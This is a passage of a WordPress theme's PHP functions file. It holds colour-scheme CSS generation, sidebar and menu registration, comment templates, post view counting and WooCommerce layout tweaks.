				.widget_search form > div:before {color: '.$color_scheme_two.';} .nav-previous a:hover  {background: '.$color_scheme_two.';} .nav-next a:hover {background:'.$color_scheme_two.';} 
				.logged-in-as a {color: '.$color_scheme_two.';} .author-card {color: '.$color_scheme_two.';} .comment-reply-link {color: '.$color_scheme_two.';} .link-format a:before {color: '.$color_scheme_two.';}
				.archive-tags:before {color: '.$color_scheme_two.';} .archive-date:before {color: '.$color_scheme_two.';} .archive-search:before {color: '.$color_scheme_two.';} .archive-category:before {color: '.$color_scheme_two.';} .tweet_text a {color: '.$color_scheme_two.';} .dankov_post_content a:hover {color: '.$color_scheme_two.';} 
				.bbp-forum-info a {color: '.$color_scheme_two.';} .bbp-body .bbp-topic-title > a {color: '.$color_scheme_two.';} .woocommerce .woocommerce-info, .woocommerce-page .woocommerce-info {border-top: 2px solid '.$color_scheme_two.';}
				.woocommerce .woocommerce-info:before, .woocommerce-page .woocommerce-info:before {background-color: '.$color_scheme_two.';} .woocommerce span.onsale, .woocommerce-page span.onsale {background:'.$color_scheme_two.';} .woocommerce #content input.button, .woocommerce #respond input#submit, .woocommerce a.button, .woocommerce button.button, .woocommerce input.button, .woocommerce-page #content input.button, .woocommerce-page #respond input#submit, .woocommerce-page a.button, .woocommerce-page button.button, .woocommerce-page input.button {background:'.$color_scheme_two.';}
				.woocommerce #content input.button:hover, .woocommerce #respond input#submit:hover, .woocommerce a.button:hover, .woocommerce button.button:hover, .woocommerce input.button:hover, .woocommerce-page #content input.button:hover, .woocommerce-page #respond input#submit:hover, .woocommerce-page a.button:hover, .woocommerce-page button.button:hover, .woocommerce-page input.button:hover {background: '.$color_scheme_two.';}
				.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content, .woocommerce-page .widget_price_filter .price_slider_wrapper .ui-widget-content {background: '.$color_scheme_two.';} .woocommerce .widget_price_filter .ui-slider .ui-slider-range, .woocommerce-page .widget_price_filter .ui-slider .ui-slider-range {background: '.$color_scheme_two.';box-shadow: inset 0 1px 0px '.$color_scheme_two.', inset 0 -1px 0px '.$color_scheme_two.', inset 0 2px 0px rgba(255,255,255,0.37);}
				.woocommerce ul.products li.product h3:hover, .woocommerce-page ul.products li.product h3:hover {color:'.$color_scheme_two.';} .woocommerce ul.products li.product .price ins, .woocommerce-page ul.products li.product .price ins {color:'.$color_scheme_two.';}
				.woocommerce .price .amount {color: '.$color_scheme_two.';} .add_to_cart_button:before {color: '.$color_scheme_two.';} .added_to_cart:after {color: '.$color_scheme_two.';} .woocommerce ul.products li.product .price, .woocommerce-page ul.products li.product .price {color: '.$color_scheme_two.';} .widget_product_search form > div:before {color: '.$color_scheme_two.';}
				.woocommerce #content input.button.alt, .woocommerce #respond input#submit.alt, .woocommerce a.button.alt, .woocommerce button.button.alt, .woocommerce input.button.alt, .woocommerce-page #content input.button.alt, .woocommerce-page #respond input#submit.alt, .woocommerce-page a.button.alt, .woocommerce-page button.button.alt, .woocommerce-page input.button.alt {background: '.$color_scheme_two.';} .woocommerce #content input.button.alt:hover, .woocommerce #respond input#submit.alt:hover, .woocommerce a.button.alt:hover, .woocommerce button.button.alt:hover, .woocommerce input.button.alt:hover, .woocommerce-page #content input.button.alt:hover, .woocommerce-page #respond input#submit.alt:hover, .woocommerce-page a.button.alt:hover, .woocommerce-page button.button.alt:hover, .woocommerce-page input.button.alt:hover {background: '.$color_scheme_two.';}
				.woocommerce .star-rating span:before, .woocommerce-page .star-rating span:before {color: '.$color_scheme_two.';} .single-product [itemprop="offers"] ins .amount {color: '.$color_scheme_two.';}
				#buddypress ul.item-list li div.item-title a {color: '.$color_scheme_two.';} #buddypress .activity-header a, #buddypress .comment-meta a, #buddypress .acomment-meta a  {color: '.$color_scheme_two.';} #buddypress div.item-list-tabs#subnav ul li.feed a {color: '.$color_scheme_two.';}
				#buddypress div.item-list-tabs ul li.selected a, #buddypress div.item-list-tabs ul li.current a {background-color: '.$color_scheme_two.';} 
				#buddypress button:hover, #buddypress a.button:hover, #buddypress a.button:focus, #buddypress input[type=submit]:hover, #buddypress input[type=button]:hover, #buddypress input[type=reset]:hover, #buddypress ul.button-nav li a:hover, #buddypress ul.button-nav li.current a, #buddypress div.generic-button a:hover, #buddypress .comment-reply-link:hover {border-color: '.$color_scheme_two.'; color: '.$color_scheme_two.';}  
				#buddypress button, #buddypress a.button, #buddypress input[type=submit], #buddypress input[type=button], #buddypress input[type=reset], #buddypress ul.button-nav li a, #buddypress div.generic-button a, #buddypress .comment-reply-link, a.bp-title-button {background: '.$color_scheme_two.'; border-color: '.$color_scheme_two.';}';
	

			if ($scheme_alpha != 1) {
				$bgOpacity = "rgba(" . dankov_hex2rgb($color_scheme_two) . "," . $scheme_alpha . ")";
				$output_scheme_two .= '.post-thumbnail .single-item {background: '. $bgOpacity .'}';
			}


			wp_add_inline_style( 'dankov-style', $output_scheme_two );	
		} 

			
}

add_action( 'wp_enqueue_scripts', 'dankov_scripts_styles' );



/*
|--------------------------------------------------------------------------
| prostore title
|--------------------------------------------------------------------------
*/ 

function dankov_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name', 'display' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'dankov' ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'dankov_wp_title', 10, 2 );


/*
|--------------------------------------------------------------------------
| HEX to RGB function
|--------------------------------------------------------------------------
*/ 
function dankov_hex2rgb($hex) {
   $hex = str_replace("#", "", $hex);

   if(strlen($hex) == 3) {
      $r = hexdec(substr($hex,0,1).substr($hex,0,1));
      $g = hexdec(substr($hex,1,1).substr($hex,1,1));
      $b = hexdec(substr($hex,2,1).substr($hex,2,1));
   } else {
      $r = hexdec(substr($hex,0,2));
      $g = hexdec(substr($hex,2,2));
      $b = hexdec(substr($hex,4,2));
   }
   $rgb = array($r, $g, $b);
   return implode(",", $rgb); // returns the rgb values separated by commas
}


/*
|--------------------------------------------------------------------------
| prostore page menu
|--------------------------------------------------------------------------
*/ 

function dankov_page_menu_args( $args ) {
	if ( ! isset( $args['show_home'] ) )
		$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'dankov_page_menu_args' );


/*
|--------------------------------------------------------------------------
| prostore widgets
|--------------------------------------------------------------------------
*/ 

function dankov_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Main Sidebar', 'dankov' ),
		'id' => 'sidebar-1',
		'description' => __( 'Appears on posts and pages except the optional Front Page template, which has its own widgets', 'dankov' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Feature Text', 'dankov' ),
		'id' => 'feature-text',
		'description' => __( 'Appears on all pages at the bottom of site.', 'dankov' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1>',
	) );

	register_sidebar( array(
		'name' => __( 'Footer Sidebar 1', 'dankov' ),
		'id' => 'footer-1',
		'description' => __( 'Appears on all pages at the bottom of site.', 'dankov' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );


	register_sidebar( array(
		'name' => __( 'Footer Sidebar 2', 'dankov' ),
		'id' => 'footer-2',
		'description' => __( 'Appears on all pages at the bottom of site.', 'dankov' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Footer Sidebar 3', 'dankov' ),
		'id' => 'footer-3',
		'description' => __( 'Appears on all pages at the bottom of site.', 'dankov' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	register_sidebar( array(
		'name' => __( 'WooCommerce Sidebar', 'dankov' ),
		'id' => 'woocommerce',
		'description' => __( 'Appears on all pages at the bottom of site.', 'dankov' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );


}
add_action( 'widgets_init', 'dankov_widgets_init' );

/*
|--------------------------------------------------------------------------
| prostore content navigation
|--------------------------------------------------------------------------
*/ 

if ( ! function_exists( 'dankov_content_nav' ) ) :

function dankov_content_nav( $html_id ) {
	global $wp_query;

	$html_id = esc_attr( $html_id );

	if ( $wp_query->max_num_pages > 1 ) : ?>
		<nav id="<?php echo $html_id; ?>" class="navigation" role="navigation">
			<div class="nav-previous"><?php next_posts_link( '<span class="meta-nav">&larr;</span>'.__('Older posts', 'dankov' ) ); ?></div>
			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts', 'dankov' ) . '<span class="meta-nav">&rarr;</span>' ); ?></div>
		</nav><!-- #<?php echo $html_id; ?> .navigation -->
	<?php endif;
}
endif;



/*
|--------------------------------------------------------------------------
| prostore comments
|--------------------------------------------------------------------------
*/ 

if ( ! function_exists( 'dankov_comment' ) ) :
function dankov_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'dankov' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( 'Edit', 'dankov' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		global $post;
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="comment">
			<header class="comment-meta comment-author vcard">
				<?php
					echo get_avatar( $comment, 75 );
					printf( '<div class="author-card">%1$s</div>',
						get_comment_author_link(),
						( $comment->user_id === $post->post_author ) ? '<span>' . __( 'Post author', 'dankov' ) . '</span>' : ''
					);
					printf( '<div class="comment-time">%3$s</div>',
						esc_url( get_comment_link( $comment->comment_ID ) ),
						get_comment_time( 'c' ),
						sprintf( __( '%1$s at %2$s', 'dankov' ), get_comment_date(), get_comment_time() )
					);
				?>
			</header>

			<?php if ( '0' == $comment->comment_approved ) : ?>
				<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'dankov' ); ?></p>
			<?php endif; ?>

			<section class="comment-content comment">
				<?php comment_text(); ?>
				<?php edit_comment_link( __( 'Edit', 'dankov' ), '<div class="edit-link">', '</div>' ); ?>
				<div class="reply">
					<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'dankov' ), 'after' => '', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
				</div><!-- .reply -->
			</section><!-- .comment-content -->
		</article><!-- #comment-## -->
	<?php
		break;
	endswitch; // end comment_type check
}
endif;


/*
|--------------------------------------------------------------------------
| prostore post types and functions
|--------------------------------------------------------------------------
*/ 

function dankov_setup() {

	add_editor_style();

	add_theme_support( 'automatic-feed-links' );

	add_theme_support( 'post-formats', array( 'image', 'link', 'quote', 'video', 'audio', 'gallery' ) );
	register_nav_menu( 'primary', __( 'Top Menu', 'dankov' ) );
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 739, 9999 ); // Unlimited height, soft crop
}
add_action( 'after_setup_theme', 'dankov_setup' );




// post by views functionality
function dankov_set_post_views($postID) {
    $count_key = 'dankov_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
//To keep the count accurate, lets get rid of prefetching
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

function dankov_track_post_views ($post_id) {
    if ( !is_single() ) return;
    if ( empty ( $post_id) ) {
        global $post;
        $post_id = $post->ID;    
    }
    dankov_set_post_views($post_id);
}
add_action( 'wp_head', 'dankov_track_post_views');

function dankov_get_post_views($postID){
    $count_key = 'dankov_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}


/*-----------------------------------------------------------------------------------*/
/*	Other Functions
/*-----------------------------------------------------------------------------------*/

add_filter( 'woocommerce_show_page_title' , 'woo_hide_page_title' );
function woo_hide_page_title() {
	
	return false;
	
}

	add_filter('loop_shop_columns', 'loop_columns');
		if (!function_exists('loop_columns')) {
			function loop_columns() {
				return 3; // 3 products per row
			}
		}

	add_filter('loop_shop_per_page', create_function('$cols', 'return 12;'));

function theme_custom_background () {
	global $data;

	if ($data['boxed_swtich'] == 2) {

		$bg_size       =  ( isset($data['boxed_background']['background-size']) && $data['boxed_background']['background-size'] != '' ) ? 'background-size: '. $data['boxed_background']['background-size'] . ";\n" : null;
		$bg_color      =  ( isset($data['boxed_background']['background-color']) && $data['boxed_background']['background-color'] != '' ) ? 'background-color: ' .$data['boxed_background']['background-color'] . ";\n" : null;
		$bg_image      =  ( isset($data['boxed_background']['background-image']) && $data['boxed_background']['background-image'] != '' ) ? 'background-image: url("' . $data['boxed_background']['background-image'] . '")' . ";\n" : null;
		$bg_repeat     =  ( isset($data['boxed_background']['background-repeat']) && $data['boxed_background']['background-repeat'] != '' ) ? 'background-repeat: ' . $data['boxed_background']['background-repeat'] . ";\n" : null;
		$bg_position   =  ( isset($data['boxed_background']['background-position']) && $data['boxed_background']['background-position'] != '' ) ? 'background-position: ' . $data['boxed_background']['background-position'] . ";\n" : null;
		$bg_attachment =  ( isset($data['boxed_background']['background-attachment']) && $data['boxed_background']['background-attachment'] != '' ) ? 'background-attachment: ' . $data['boxed_background']['background-attachment'] . ";\n" : null;

		echo "<style>\n";
			echo "body {\n";
				if ($bg_size) echo "\t" . $bg_size;
				if ($bg_color) echo "\t" . $bg_color;
				if ($bg_image) echo "\t" . $bg_image;
				if ($bg_repeat) echo "\t" . $bg_repeat;
				if ($bg_position) echo "\t" . $bg_position;
				if ($bg_attachment) echo "\t" . $bg_attachment;
			echo "}\n";
		echo "</style>\n";

		return true;
	}
	return false;
}
